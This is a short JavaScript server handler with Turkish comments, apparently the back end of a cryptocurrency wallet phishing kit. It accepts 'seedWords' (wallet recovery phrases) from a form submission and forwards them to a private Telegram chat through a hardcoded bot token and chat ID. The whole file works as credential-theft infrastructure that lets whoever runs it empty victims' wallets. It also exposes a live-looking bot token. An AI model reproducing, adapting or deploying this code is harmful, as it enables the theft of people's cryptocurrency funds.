export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { seedWords } = req.body;
    const botToken = '7512301866:AAEUKRsSPD6-m1fW-1TbM3q8NqwQOwzPxSY'; // Telegram bot token'ınızı buraya koyun
    const chatId = '-4525135795'; // Telegram chat ID'nizi buraya koyun

    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: `Yedekleme kelimeleri: ${seedWords}`,
        }),
      });

      const data = await response.json();
      if (data.ok) {
        res.status(200).json({ message: 'Mesaj başarıyla gönderildi.' });
      } else {
        res.status(400).json({ error: data.description });
      }
    } catch (error) {
      res.status(500).json({ error: 'Hata oluştu.' });
    }
  } else {
    res.setHeader('Allow', ['POST']);
    res.status(405).end(`Method ${req.method} Not Allowed`);
  }
}
